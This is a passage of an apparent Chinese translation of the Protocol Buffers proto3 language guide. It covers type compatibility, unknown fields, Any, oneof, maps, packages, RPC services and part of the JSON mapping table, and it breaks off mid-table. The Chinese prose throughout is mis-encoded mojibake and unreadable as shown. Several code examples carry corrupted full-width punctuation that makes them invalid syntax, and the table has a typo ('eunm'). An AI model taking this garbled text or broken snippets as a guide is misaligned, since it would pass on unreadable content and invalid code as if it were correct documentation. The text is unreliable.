++ä¸­å°†è¯¥æ•°å­—è½¬æ¢ä¸ºè¯¥ç±»å‹ç›¸åŒçš„æ•ˆæœï¼ˆä¾‹å¦‚ï¼Œå¦‚æœå°†64ä½æ•°å­—ä½œä¸ºint32è¯»å–ï¼Œå®ƒå°†è¢«æˆªæ–­ä¸º32ä½ï¼‰ã€‚\n- `sint32`å¹¶ä¸”`sint64`å½¼æ­¤å…¼å®¹ä½†ä¸å…¶ä»–æ•´æ•°ç±»å‹*ä¸*å…¼å®¹ã€‚\n- `string``bytes`åªè¦å­—èŠ‚æ˜¯æœ‰æ•ˆçš„UTF-8 ï¼Œå®ƒä»¬æ˜¯å…¼å®¹çš„ã€‚\n- `bytes`å¦‚æœå­—èŠ‚åŒ…å«æ¶ˆæ¯çš„ç¼–ç ç‰ˆæœ¬ï¼Œåˆ™åµŒå…¥æ¶ˆæ¯æ˜¯å…¼å®¹çš„ã€‚\n- `fixed32`ä¸å…¼å®¹`sfixed32`ï¼Œå¹¶`fixed64`ç”¨`sfixed64`ã€‚\n- `enum`ä¸å…¼å®¹`int32`ï¼Œ`uint32`ï¼Œ`int64`ï¼Œå’Œ`uint64`ç”µçº¿æ ¼å¼æ¡æ¬¾ï¼ˆæ³¨æ„ï¼Œå¦‚æœä»–ä»¬ä¸é€‚åˆçš„å€¼å°†è¢«æˆªæ–­ï¼‰ã€‚ä½†è¯·æ³¨æ„ï¼Œåœ¨ååºåˆ—åŒ–æ¶ˆæ¯æ—¶ï¼Œå®¢æˆ·ç«¯ä»£ç å¯èƒ½ä¼šä»¥ä¸åŒæ–¹å¼å¯¹å¾…å®ƒä»¬ï¼šä¾‹å¦‚ï¼Œ`enum`å°†åœ¨æ¶ˆæ¯ä¸­ä¿ç•™æœªè¯†åˆ«çš„proto3 ç±»å‹ï¼Œä½†åœ¨ååºåˆ—åŒ–æ¶ˆæ¯æ—¶å¦‚ä½•è¡¨ç¤ºè¿™ç§ç±»å‹å–å†³äºè¯­è¨€ã€‚Intå­—æ®µæ€»æ˜¯ä¿ç•™å®ƒä»¬çš„ä»·å€¼ã€‚\n- å°†å•ä¸ªå€¼æ›´æ”¹ä¸º**æ–°** æˆå‘˜`oneof`æ˜¯å®‰å…¨ä¸”äºŒè¿›åˆ¶å…¼å®¹çš„ã€‚`oneof`å¦‚æœæ‚¨ç¡®å®šæ²¡æœ‰ä»£ç ä¸€æ¬¡è®¾ç½®å¤šä¸ªå­—æ®µï¼Œåˆ™å°†å¤šä¸ªå­—æ®µç§»åŠ¨åˆ°æ–°å­—æ®µå¯èƒ½æ˜¯å®‰å…¨çš„ã€‚å°†ä»»ä½•å­—æ®µç§»åŠ¨åˆ°ç°æœ‰å­—æ®µ`oneof`å¹¶ä¸å®‰å…¨ã€‚\n\n\n\n### 8. æœªçŸ¥å­—æ®µ\n\næœªçŸ¥å­—æ®µæ˜¯æ ¼å¼è‰¯å¥½çš„åè®®ç¼“å†²åŒºåºåˆ—åŒ–æ•°æ®ï¼Œè¡¨ç¤ºè§£æå™¨æ— æ³•è¯†åˆ«çš„å­—æ®µã€‚ä¾‹å¦‚ï¼Œå½“æ—§äºŒè¿›åˆ¶æ–‡ä»¶è§£æå…·æœ‰æ–°å­—æ®µçš„æ–°äºŒè¿›åˆ¶æ–‡ä»¶å‘é€çš„æ•°æ®æ—¶ï¼Œè¿™äº›æ–°å­—æ®µå°†æˆä¸ºæ—§äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æœªçŸ¥å­—æ®µã€‚\n\næœ€åˆï¼Œproto3æ¶ˆæ¯åœ¨è§£ææœŸé—´æ€»æ˜¯ä¸¢å¼ƒæœªçŸ¥å­—æ®µï¼Œä½†åœ¨3.5ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬é‡æ–°å¼•å…¥äº†ä¿å­˜æœªçŸ¥å­—æ®µä»¥åŒ¹é…proto2è¡Œä¸ºã€‚åœ¨ç‰ˆæœ¬3.5åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒæœªçŸ¥å­—æ®µåœ¨è§£ææœŸé—´ä¿ç•™å¹¶åŒ…å«åœ¨åºåˆ—åŒ–è¾“å‡ºä¸­ã€‚\n\n\n\n### 9. ä»»ä½•\n\nè¯¥`Any`æ¶ˆæ¯ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨é‚®ä»¶ä½œä¸ºåµŒå…¥å¼ç±»å‹ï¼Œè€Œä¸å¿…è‡ªå·±.protoå®šä¹‰ã€‚ä¸€ä¸ª`Any`å«æœ‰ä»»æ„çš„åºåˆ—åŒ–æ¶ˆæ¯`bytes`ï¼Œä»¥å……å½“ä¸€ä¸ªå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦å’Œè§£æåˆ°è¯¥æ¶ˆæ¯çš„ç±»å‹çš„URLä¸€èµ·ã€‚è¦ä½¿ç”¨è¯¥`Any`ç±»å‹ï¼Œæ‚¨éœ€è¦[å¯¼å…¥](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23other)`google/protobuf/any.proto`ã€‚\n\n```protobuf\nimport \"google/protobuf/any.proto\";\n\nmessage ErrorStatus {\n  string message = 1;\n  repeated google.protobuf.Any details = 2;\n}\n```\n\nç»™å®šæ¶ˆæ¯ç±»å‹çš„é»˜è®¤ç±»å‹URLæ˜¯ã€‚ `type.googleapis.com/*packagename*.*messagename*`\n\nä¸åŒçš„è¯­è¨€å®ç°å°†æ”¯æŒè¿è¡Œæ—¶åº“ä½£å·¥ç±»å‹å®‰å…¨çš„æ–¹å¼æ‰“åŒ…å’Œè§£åŒ…çš„ä»»ä½•å€¼-ä¾‹å¦‚ï¼Œåœ¨Javaä¸­ï¼Œä»»ä½•ç±»å‹éƒ½ä¼šæœ‰ç‰¹æ®Š`pack()`å’Œ`unpack()`å­˜å–ï¼Œè€Œåœ¨C ++ä¸­æœ‰`PackFrom()`å’Œ`UnpackTo()`æ–¹æ³•ï¼š\n\n```protobuf\n// Storing an arbitrary message type in Any.\nNetworkErrorDetails details = ...;\nErrorStatus status;\nstatus.add_details()->PackFrom(details);\n\n// Reading an arbitrary message from Any.\nErrorStatus status = ...;\nfor (const Any& detail : status.details()) {\n  if (detail.Is<NetworkErrorDetails>()) {\n    NetworkErrorDetails network_error;\n    detail.UnpackTo(&network_error);\n    ... processing network_error ...\n  }\n}\n```\n\n**ç›®å‰ï¼Œæ­£åœ¨å¼€å‘ç”¨äºå¤„ç†Anyç±»å‹çš„è¿è¡Œæ—¶åº“**ã€‚\n\nå¦‚æœæ‚¨å·²ç†Ÿæ‚‰[proto2è¯­æ³•](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)ï¼Œåˆ™Anyç±»å‹å°†æ›¿æ¢[æ‰©å±•](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23extensions)ã€‚\n\n\n\n### 10. Oneof\n\nå¦‚æœæ‚¨æœ‰ä¸€ä¸ªåŒ…å«è®¸å¤šå­—æ®µçš„æ¶ˆæ¯ï¼Œå¹¶ä¸”æœ€å¤šåªèƒ½åŒæ—¶è®¾ç½®ä¸€ä¸ªå­—æ®µï¼Œåˆ™å¯ä»¥ä½¿ç”¨oneofåŠŸèƒ½å¼ºåˆ¶æ‰§è¡Œæ­¤è¡Œä¸ºå¹¶èŠ‚çœå†…å­˜ã€‚\n\né™¤äº†ä¸€ä¸ªå…±äº«å†…å­˜ä¸­çš„æ‰€æœ‰å­—æ®µä¹‹å¤–ï¼Œå…¶ä¸­ä¸€ä¸ªå­—æ®µç±»ä¼¼äºå¸¸è§„å­—æ®µï¼Œå¹¶ä¸”æœ€å¤šå¯ä»¥åŒæ—¶è®¾ç½®ä¸€ä¸ªå­—æ®µã€‚è®¾ç½®oneofçš„ä»»ä½•æˆå‘˜ä¼šè‡ªåŠ¨æ¸…é™¤æ‰€æœ‰å…¶ä»–æˆå‘˜ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç‰¹æ®Š`case()`æˆ–`WhichOneof()`æ–¹æ³•æ£€æŸ¥oneofä¸­çš„å“ªä¸ªå€¼ï¼ˆå¦‚æœæœ‰ï¼‰ï¼Œå…·ä½“å–å†³äºæ‚¨é€‰æ‹©çš„è¯­è¨€ã€‚\n\n##### 10.1 ä½¿ç”¨Oneof\n\nè¦åœ¨æ‚¨ä¸­å®šä¹‰oneofï¼Œè¯·`.proto`ä½¿ç”¨`oneof`å…³é”®å­—åè·Ÿæ‚¨çš„oneofåç§°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹`test_oneof`ï¼š\n\n```protobuf\nmessage SampleMessage {\n  oneof test_oneof {\n    string name = 4;\n    SubMessage sub_message = 9;\n  }\n}\n```\n\nç„¶åï¼Œå°†oneofå­—æ®µæ·»åŠ åˆ°oneofå®šä¹‰ä¸­ã€‚æ‚¨å¯ä»¥æ·»åŠ ä»»ä½•ç±»å‹çš„å­—æ®µï¼Œä½†ä¸èƒ½ä½¿ç”¨`repeated`å­—æ®µã€‚\n\nåœ¨ç”Ÿæˆçš„ä»£ç ä¸­ï¼Œoneofå­—æ®µä¸å¸¸è§„å­—æ®µå…·æœ‰ç›¸åŒçš„getterå’Œsetterã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•æ£€æŸ¥oneofä¸­çš„å€¼ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚æ‚¨å¯ä»¥åœ¨ç›¸å…³[APIå‚è€ƒä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)æ‰¾åˆ°æœ‰å…³æ‰€é€‰è¯­è¨€çš„oneof APIçš„æ›´å¤šä¿¡æ¯ã€‚\n\n##### 10.2 Oneof ç‰¹æ€§\n\n- è®¾ç½®oneofå­—æ®µå°†è‡ªåŠ¨æ¸…é™¤oneofçš„æ‰€æœ‰å…¶ä»–æˆå‘˜ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨è®¾ç½®äº†å¤šä¸ªå­—æ®µï¼Œåˆ™åªæœ‰æ‚¨è®¾ç½®çš„æœ€åä¸€ä¸ªå­—æ®µä»ç„¶å…·æœ‰å€¼ã€‚\n\n  ```protobuf\n  SampleMessage message;\n  message.set_name(\"name\");\n  CHECK(message.has_name());\n  message.mutable_sub_message();   // Will clear name field.\n  CHECK(!message.has_name());\n  ```\n  \n- å¦‚æœè§£æå™¨åœ¨çº¿è·¯ä¸Šé‡åˆ°åŒä¸€ä¸ªoneofçš„å¤šä¸ªæˆå‘˜ï¼Œåˆ™åœ¨è§£æçš„æ¶ˆæ¯ä¸­ä»…ä½¿ç”¨çœ‹åˆ°çš„æœ€åä¸€ä¸ªæˆå‘˜ã€‚\n\n- oneofä¸æ”¯æŒ`repeated`ã€‚\n\n- Reflection APIé€‚ç”¨äºå…¶ä¸­ä¸€ä¸ªå­—æ®µã€‚\n\n- å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯C ++ï¼Œè¯·ç¡®ä¿æ‚¨çš„ä»£ç ä¸ä¼šå¯¼è‡´å†…å­˜å´©æºƒã€‚ä»¥ä¸‹ç¤ºä¾‹ä»£ç å°†å´©æºƒï¼Œ`sub_message`å·²é€šè¿‡è°ƒç”¨è¯¥`set_name()`æ–¹æ³•åˆ é™¤äº†è¯¥ä»£ç ã€‚\n\n  ```protobuf\n  SampleMessage message;\n  SubMessage* sub_message = message.mutable_sub_message();\n  message.set_name(\"name\");      // Will delete sub_message\n  sub_message->set_...            // Crashes here \n  ```\n  \n- åŒæ ·åœ¨C ++ä¸­ï¼Œå¦‚æœä½ æœ‰`Swap()`ä¸¤ä¸ªæ¶ˆæ¯ä¸oneofsï¼Œæ¯ä¸ªæ¶ˆæ¯æœ€ç»ˆå°†ä¸å¦ä¸€ä¸ªæ¶ˆæ¯ç»“æœï¼šåœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ`msg1`å°†æœ‰ä¸€ä¸ª`sub_message`ï¼Œ`msg2`å¹¶å°†æœ‰ä¸€`name`ã€‚\n\n  ```protobuf\n  SampleMessage msg1;\n  msg1.set_name(\"name\");\n  SampleMessage msg2;\n  msg2.mutable_sub_message();\n  msg1.swap(&msg2);\n  CHECK(msg1.has_sub_message());\n  CHECK(msg2.has_name());\n  ```\n\n##### 10.3 å‘åå…¼å®¹æ€§é—®é¢˜\n\næ·»åŠ æˆ–åˆ é™¤å…¶ä¸­ä¸€ä¸ªå­—æ®µæ—¶è¦å°å¿ƒã€‚å¦‚æœæ£€æŸ¥oneofè¿”å›çš„å€¼`None`/ `NOT_SET`ï¼Œè¿™å¯èƒ½æ„å‘³ç€oneofå°šæœªè®¾ç½®æˆ–å·²åœ¨ä¸åŒç‰ˆæœ¬çš„oneofçš„è¢«è®¾ç½®ä¸ºä¸€ä¸ªå­—æ®µã€‚æ²¡æœ‰åŠæ³•åŒºåˆ†ï¼Œå› ä¸ºæ²¡æœ‰åŠæ³•çŸ¥é“çº¿ä¸Šçš„æœªçŸ¥å­—æ®µæ˜¯å¦æ˜¯å…¶ä¸­ä¸€ä¸ªæˆå‘˜ã€‚\n\n##### 10.4 æ ‡ç­¾é‡ç”¨é—®é¢˜\n\n- **å°†å­—æ®µç§»å…¥æˆ–ç§»å‡ºoneof**ï¼šåœ¨åºåˆ—åŒ–å’Œè§£ææ¶ˆæ¯åï¼Œæ‚¨å¯èƒ½ä¼šä¸¢å¤±ä¸€äº›ä¿¡æ¯ï¼ˆæŸäº›å­—æ®µå°†è¢«æ¸…é™¤ï¼‰ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥å®‰å…¨åœ°å°†å•ä¸ªå­—æ®µç§»åŠ¨åˆ°**æ–°çš„** oneofä¸­ï¼Œå¹¶ä¸”å¦‚æœå·²çŸ¥åªæœ‰ä¸€ä¸ªå­—æ®µè¢«è®¾ç½®ï¼Œåˆ™å¯ä»¥ç§»åŠ¨å¤šä¸ªå­—æ®µã€‚\n- **åˆ é™¤oneofå­—æ®µå¹¶å°†å…¶æ·»åŠ å›**ï¼šåœ¨åºåˆ—åŒ–å’Œè§£ææ¶ˆæ¯åï¼Œè¿™å¯èƒ½ä¼šæ¸…é™¤å½“å‰è®¾ç½®çš„oneofå­—æ®µã€‚\n- **æ‹†åˆ†æˆ–åˆå¹¶oneof**ï¼šè¿™ä¸ç§»åŠ¨å¸¸è§„å­—æ®µæœ‰ç±»ä¼¼çš„é—®é¢˜ã€‚\n\n### 11. åœ°å›¾\n\nå¦‚æœè¦åœ¨æ•°æ®å®šä¹‰ä¸­åˆ›å»ºå…³è”æ˜ å°„ï¼Œåè®®ç¼“å†²åŒºæä¾›äº†ä¸€ç§æ–¹ä¾¿çš„å¿«æ·æ–¹å¼è¯­æ³•ï¼š\n\n```protobuf\nmap < key_type ï¼Œvalue_type > map_field = N ;\n```\n\n...å…¶ä¸­`key_type`å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°æˆ–å­—ç¬¦ä¸²ç±»å‹ï¼ˆå› æ­¤ï¼Œé™¤äº†æµ®ç‚¹ç±»å‹ä¹‹å¤–çš„ä»»ä½•[æ ‡é‡](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)ç±»å‹`bytes`ï¼‰ã€‚è¯·æ³¨æ„ï¼Œæšä¸¾ä¸æ˜¯æœ‰æ•ˆçš„`key_type`ã€‚çš„`value_type`å¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„é™¤å¦ä¸€åœ°å›¾ã€‚\n\nå› æ­¤ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¦åˆ›å»ºé¡¹ç›®æ˜ å°„ï¼Œå…¶ä¸­æ¯æ¡`Project`æ¶ˆæ¯éƒ½ä¸å­—ç¬¦ä¸²é”®ç›¸å…³è”ï¼Œåˆ™å¯ä»¥åƒä¸‹é¢è¿™æ ·å®šä¹‰å®ƒï¼š\n\n```protobuf\nmap < string ï¼ŒProject > projects = 3 ;  \n```\n\n- åœ°å›¾å­—æ®µä¸èƒ½`repeated`ã€‚\n- åœ°å›¾å€¼çš„æœ‰çº¿æ ¼å¼æ’åºå’Œåœ°å›¾è¿­ä»£æ’åºæœªå®šä¹‰ï¼Œå› æ­¤æ‚¨ä¸èƒ½ä¾èµ–äºç‰¹å®šé¡ºåºçš„åœ°å›¾é¡¹ç›®ã€‚\n- ä¸ºaç”Ÿæˆæ–‡æœ¬æ ¼å¼æ—¶`.proto`ï¼Œåœ°å›¾æŒ‰é”®æ’åºã€‚æ•°å­—é”®æŒ‰æ•°å­—æ’åºã€‚\n- ä»çº¿è·¯è§£ææˆ–åˆå¹¶æ—¶ï¼Œå¦‚æœæœ‰é‡å¤çš„æ˜ å°„é”®ï¼Œåˆ™ä½¿ç”¨æœ€åçœ‹åˆ°çš„é”®ã€‚ä»æ–‡æœ¬æ ¼å¼è§£ææ˜ å°„æ—¶ï¼Œå¦‚æœå­˜åœ¨é‡å¤é”®ï¼Œåˆ™è§£æå¯èƒ½ä¼šå¤±è´¥ã€‚\n- å¦‚æœä¸ºæ˜ å°„å­—æ®µæä¾›é”®ä½†æ²¡æœ‰å€¼ï¼Œåˆ™å­—æ®µåºåˆ—åŒ–æ—¶çš„è¡Œä¸ºå–å†³äºè¯­è¨€ã€‚åœ¨C ++ï¼ŒJavaå’ŒPythonä¸­ï¼Œç±»å‹çš„é»˜è®¤å€¼æ˜¯åºåˆ—åŒ–çš„ï¼Œè€Œåœ¨å…¶ä»–è¯­è¨€ä¸­æ²¡æœ‰ä»»ä½•åºåˆ—åŒ–ã€‚\n\nç”Ÿæˆçš„åœ°å›¾APIç›®å‰å¯ç”¨äºæ‰€æœ‰proto3æ”¯æŒçš„è¯­è¨€ã€‚æ‚¨å¯ä»¥åœ¨ç›¸å…³[APIå‚è€ƒä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)æ‰¾åˆ°æœ‰å…³æ‰€é€‰è¯­è¨€çš„åœ°å›¾APIçš„æ›´å¤šä¿¡æ¯ã€‚\n\n##### 11.1 å‘åå…¼å®¹æ€§\n\næ˜ å°„è¯­æ³•åœ¨çº¿ä¸Šç­‰æ•ˆäºä»¥ä¸‹å†…å®¹ï¼Œå› æ­¤ä¸æ”¯æŒæ˜ å°„çš„åè®®ç¼“å†²åŒºå®ç°ä»å¯å¤„ç†æ‚¨çš„æ•°æ®ï¼š\n\n```\nmessage MapFieldEntry {\n  key_type key = 1;\n  value_type value = 2;\n}\n\nrepeated MapFieldEntry map_field = N;\n```\n\nä»»ä½•æ”¯æŒæ˜ å°„çš„åè®®ç¼“å†²åŒºå®ç°éƒ½å¿…é¡»ç”Ÿæˆå’Œæ¥å—ä¸Šè¿°å®šä¹‰å¯ä»¥æ¥å—çš„æ•°æ®ã€‚\n\n\n\n### 12. åŒ…\n\næ‚¨å¯ä»¥å‘`.proto`æ–‡ä»¶æ·»åŠ `package`å¯é€‰è¯´æ˜ç¬¦ï¼Œä»¥é˜²æ­¢åè®®æ¶ˆæ¯ç±»å‹ä¹‹é—´çš„åç§°å†²çªã€‚\n\n```protobuf\npackage foo.bar;\nmessage Open { ... }\n```\n\nç„¶åï¼Œæ‚¨å¯ä»¥åœ¨å®šä¹‰æ¶ˆæ¯ç±»å‹çš„å­—æ®µæ—¶ä½¿ç”¨åŒ…è¯´æ˜ç¬¦ï¼š\n\n```protobuf\nmessage Foo {\n  ...\n  foo.bar.Open open = 1;\n  ...\n}\n```\n\nåŒ…è¯´æ˜ç¬¦å½±å“ç”Ÿæˆçš„ä»£ç çš„æ–¹å¼å–å†³äºæ‚¨é€‰æ‹©çš„è¯­è¨€ï¼š\n\n- åœ¨**C ++ä¸­**ï¼Œç”Ÿæˆçš„ç±»åŒ…å«åœ¨C ++å‘½åç©ºé—´ä¸­ã€‚ä¾‹å¦‚ï¼Œ`Open`å°†åœ¨å‘½åç©ºé—´ä¸­`foo::bar`ã€‚\n- åœ¨**Javaä¸­**ï¼Œè¯¥åŒ…ç”¨ä½œJavaåŒ…ï¼Œé™¤éæ‚¨`option java_package`åœ¨`.proto`æ–‡ä»¶ä¸­æ˜ç¡®æä¾›äº†è¯¥åŒ…ã€‚\n- åœ¨**Pythonä¸­**ï¼ŒpackageæŒ‡ä»¤è¢«å¿½ç•¥ï¼Œå› ä¸ºPythonæ¨¡å—æ˜¯æ ¹æ®å®ƒä»¬åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä½ç½®è¿›è¡Œç»„ç»‡çš„ã€‚\n- åœ¨**Goä¸­**ï¼Œè¯¥åŒ…ç”¨ä½œGoåŒ…åç§°ï¼Œé™¤éæ‚¨`option go_package`åœ¨`.proto`æ–‡ä»¶ä¸­æ˜ç¡®æä¾›ã€‚\n- åœ¨**Rubyä¸­**ï¼Œç”Ÿæˆçš„ç±»åŒ…å«åœ¨åµŒå¥—çš„Rubyå‘½åç©ºé—´å†…ï¼Œè½¬æ¢ä¸ºæ‰€éœ€çš„Rubyå¤§å†™å½¢å¼ï¼ˆé¦–å­—æ¯å¤§å†™;å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯å­—æ¯ï¼Œ`PB_`åˆ™å‰ç½®ï¼‰ã€‚ä¾‹å¦‚ï¼Œ`Open`å°†åœ¨å‘½åç©ºé—´ä¸­`Foo::Bar`ã€‚\n- åœ¨**Cï¼ƒä¸­**ï¼ŒåŒ…è½¬æ¢ä¸ºPascalCaseåç”¨ä½œå‘½åç©ºé—´ï¼Œé™¤éæ‚¨`option csharp_namespace`åœ¨`.proto`æ–‡ä»¶ä¸­æ˜ç¡®æä¾›ã€‚ä¾‹å¦‚ï¼Œ`Open`å°†åœ¨å‘½åç©ºé—´ä¸­`Foo.Bar`ã€‚\n\n##### 12.1 åŒ…å’Œåç§°è§£æ\n\nåè®®ç¼“å†²åŒºè¯­è¨€ä¸­çš„ç±»å‹åç§°è§£æä¸C ++ç±»ä¼¼ï¼šé¦–å…ˆæœç´¢æœ€é‡Œé¢çš„èŒƒå›´ï¼Œç„¶åæœç´¢ä¸‹ä¸€ä¸ªèŒƒå›´ï¼Œä¾æ­¤ç±»æ¨ï¼Œæ¯ä¸ªåŒ…è¢«è®¤ä¸ºæ˜¯å…¶çˆ¶åŒ…çš„â€œå†…éƒ¨â€ã€‚ä¸€ä¸ªé¢†å…ˆçš„'ã€‚' ï¼ˆä¾‹å¦‚ï¼Œ`.foo.bar.Baz`ï¼‰æ„å‘³ç€ä»æœ€å¤–å±‚çš„èŒƒå›´å¼€å§‹ã€‚\n\nprotobuf ç¼–è¯‘å™¨é€šè¿‡è§£æå¯¼å…¥çš„`.proto`æ–‡ä»¶æ¥è§£ææ‰€æœ‰ç±»å‹åç§°ã€‚æ¯ç§è¯­è¨€çš„ä»£ç ç”Ÿæˆå™¨éƒ½çŸ¥é“å¦‚ä½•ä½¿ç”¨è¯¥è¯­è¨€å¼•ç”¨æ¯ç§ç±»å‹ï¼Œå³ä½¿å®ƒå…·æœ‰ä¸åŒçš„èŒƒå›´è§„åˆ™ã€‚\n\n\n\n### 13. å®šä¹‰æœåŠ¡\n\nå¦‚æœè¦å°†æ¶ˆæ¯ç±»å‹ä¸RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ç³»ç»Ÿä¸€èµ·ä½¿ç”¨ï¼Œåˆ™å¯ä»¥åœ¨`.proto`æ–‡ä»¶ä¸­å®šä¹‰RPCæœåŠ¡æ¥å£ï¼Œprotobuf ç¼–è¯‘å™¨å°†ä½¿ç”¨æ‚¨é€‰æ‹©çš„è¯­è¨€ç”ŸæˆæœåŠ¡æ¥å£ä»£ç å’Œå­˜æ ¹ã€‚å› æ­¤ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¦å®šä¹‰RPCæœåŠ¡è¯·æ±‚æ–¹æ³•ä¸º:`SearchRequest`å’Œè¿”å›æ–¹æ³•ä¸º:`SearchResponse`ï¼Œå¯ä»¥`.proto`æŒ‰å¦‚ä¸‹æ–¹å¼åœ¨æ–‡ä»¶ä¸­å®šä¹‰å®ƒï¼š\n\n```protobuf\nservice SearchService {\n  rpc Searchï¼ˆSearchRequestï¼‰returnsï¼ˆSearchResponseï¼‰;\n}\n```\n\nä¸åè®®ç¼“å†²åŒºä¸€èµ·ä½¿ç”¨çš„æœ€ç®€å•çš„RPCç³»ç»Ÿæ˜¯[gRPC](https://link.juejin.im?target=https%3A%2F%2Fgrpc.io%2F)ï¼šä¸€ç§ç”±Googleå¼€å‘çš„ï¼Œå¹³å°ä¸­ç«‹çš„å¼€æºRPCç³»ç»Ÿã€‚gRPCç‰¹åˆ«é€‚ç”¨äºprotobufï¼Œå¹¶å…è®¸åœ¨æ‚¨çš„`.proto`æ–‡ä»¶ä¸­ä½¿ç”¨ç‰¹æ®Šçš„protobuf ç¼–è¯‘å™¨æ’ä»¶ç›´æ¥ç”Ÿæˆç›¸å…³çš„RPCä»£ç ã€‚\n\nå¦‚æœæ‚¨ä¸æƒ³ä½¿ç”¨gRPCï¼Œä¹Ÿå¯ä»¥å°†protobufä¸æ‚¨è‡ªå·±çš„RPCå®ç°ä¸€èµ·ä½¿ç”¨ã€‚æ‚¨å¯ä»¥åœ¨[Proto2è¯­è¨€æŒ‡å—ä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23services)æ‰¾åˆ°æ›´å¤šç›¸å…³ä¿¡æ¯ã€‚\n\nè¿˜æœ‰ä¸€äº›æ­£åœ¨è¿›è¡Œçš„ç¬¬ä¸‰æ–¹é¡¹ç›®ä½¿ç”¨Protocol Bufferså¼€å‘RPCå®ç°ã€‚æœ‰å…³æˆ‘ä»¬äº†è§£çš„é¡¹ç›®çš„é“¾æ¥åˆ—è¡¨ï¼Œè¯·å‚é˜…[ç¬¬ä¸‰æ–¹åŠ è½½é¡¹wikié¡µé¢](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fprotobuf%2Fblob%2Fmaster%2Fdocs%2Fthird_party.md)ã€‚\n\n\n\n### 14. JSONæ˜ å°„\n\nProto3æ”¯æŒJSONä¸­çš„è§„èŒƒç¼–ç ï¼Œä½¿å¾—åœ¨ç³»ç»Ÿä¹‹é—´å…±äº«æ•°æ®å˜å¾—æ›´åŠ å®¹æ˜“ã€‚åœ¨ä¸‹è¡¨ä¸­é€ä¸ªç±»å‹åœ°æè¿°ç¼–ç ã€‚\n\nå¦‚æœJSONç¼–ç æ•°æ®ä¸­ç¼ºå°‘å€¼`null`ï¼Œæˆ–è€…å…¶å€¼ä¸ºï¼Œåˆ™åœ¨è§£æä¸ºåè®®ç¼“å†²åŒºæ—¶ï¼Œå®ƒå°†è¢«è§£é‡Šä¸ºé€‚å½“çš„[é»˜è®¤å€¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)ã€‚å¦‚æœå­—æ®µåœ¨åè®®ç¼“å†²åŒºä¸­å…·æœ‰é»˜è®¤å€¼ï¼Œåˆ™é»˜è®¤æƒ…å†µä¸‹å°†åœ¨JSONç¼–ç æ•°æ®ä¸­çœç•¥è¯¥å­—æ®µä»¥èŠ‚çœç©ºé—´ã€‚å®ç°å¯ä»¥æä¾›ç”¨äºåœ¨JSONç¼–ç çš„è¾“å‡ºä¸­å‘å‡ºå…·æœ‰é»˜è®¤å€¼çš„å­—æ®µçš„é€‰é¡¹ã€‚\n\n| proto3                 | JSON          | JSONç¤ºä¾‹                                 | ç¬”è®°                                                         |\n| ---------------------- | ------------- | ---------------------------------------- | ------------------------------------------------------------ |\n| message                | object        | `{\"fooBar\": v, \"g\": null,â€¦}`             | ç”ŸæˆJSONå¯¹è±¡ã€‚æ¶ˆæ¯å­—æ®µåç§°æ˜ å°„åˆ°å°å†™é©¼å³°å¹¶æˆä¸ºJSONå¯¹è±¡é”®ã€‚å¦‚æœ`json_name`æŒ‡å®šäº†fieldé€‰é¡¹ï¼Œåˆ™æŒ‡å®šçš„å€¼å°†ç”¨ä½œé”®ã€‚è§£æå™¨æ¥å—å°å†™é©¼å³°åç§°ï¼ˆæˆ–`json_name`é€‰é¡¹æŒ‡å®šçš„åç§°ï¼‰å’ŒåŸå§‹protoå­—æ®µåç§°ã€‚`null`æ˜¯æ‰€æœ‰å­—æ®µç±»å‹çš„å¯æ¥å—å€¼ï¼Œå¹¶å°†å…¶è§†ä¸ºç›¸åº”å­—æ®µç±»å‹çš„é»˜è®¤å€¼ã€‚ |\n| eunm                   | String        | `\"FOO_BAR\"`                              | ä½¿ç”¨protoä¸­æŒ‡å®šçš„æšä¸¾å€¼çš„åç§°ã€‚è§£æå™¨æ¥å—æšä¸¾åç§°å’Œæ•´æ•°å€¼ã€‚  |\n| map<Kï¼ŒV>              | object        | `{\"k\": v, â€¦}`                            | æ‰€æœ‰é”®éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚                                       |\n| repeated V.            | array         | `[v, â€¦]`                                 | `null` è¢«æ¥å—ä¸ºç©ºåˆ—è¡¨[]ã€‚                                    |\n| bool                   | true,false    | `true, false`                            |                                                              |\n| string                 | string        | `\"Hello World!\"`                         |                                                              |\n| bytes                  | base64 string | `\"YWJjMTIzIT8kKiYoKSctPUB+\"`             | 